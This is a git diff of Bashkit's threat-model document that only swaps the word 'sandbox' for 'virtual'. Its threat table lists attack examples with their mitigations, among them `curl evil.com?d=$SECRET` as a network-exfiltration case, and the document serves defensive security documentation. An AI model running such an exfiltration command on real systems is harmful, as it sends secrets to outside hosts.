@@ -1,6 +1,6 @@
 # Threat Model
 
-Bashkit is designed to execute untrusted bash scripts safely in sandboxed environments.
+Bashkit is designed to execute untrusted bash scripts safely in virtual environments.
 This document describes the security threats we address and how they are mitigated.
 
 **See also:**
@@ -11,7 +11,7 @@ This document describes the security threats we address and how they are mitigat
 
 ## Overview
 
-Bashkit assumes all script input is potentially malicious. The sandbox prevents:
+Bashkit assumes all script input is potentially malicious. The virtual environment prevents:
 
 - **Resource exhaustion** (CPU, memory, disk)
 - **Sandbox escape** (filesystem, process, privilege)
@@ -100,7 +100,7 @@ Scripts may attempt to leak sensitive information.
 | Threat | Attack Example | Mitigation | Code Reference |
 |--------|---------------|------------|----------------|
 | Env var leak (TM-INF-001) | `echo $SECRET` | Caller responsibility | See below |
-| Host info (TM-INF-005) | `hostname` | Returns sandbox value | [`builtins/system.rs`][system] |
+| Host info (TM-INF-005) | `hostname` | Returns virtual value | [`builtins/system.rs`][system] |
 | Network exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | [`network/allowlist.rs`][allowlist] |
 
 **Caller Responsibility (TM-INF-001):**
@@ -123,7 +123,7 @@ let bash = Bash::builder()
 
 **System Information:**
 
-System builtins return configurable sandbox values, never real host information:
+System builtins return configurable virtual values, never real host information:
 
 ```rust,ignore
 let bash = Bash::builder()
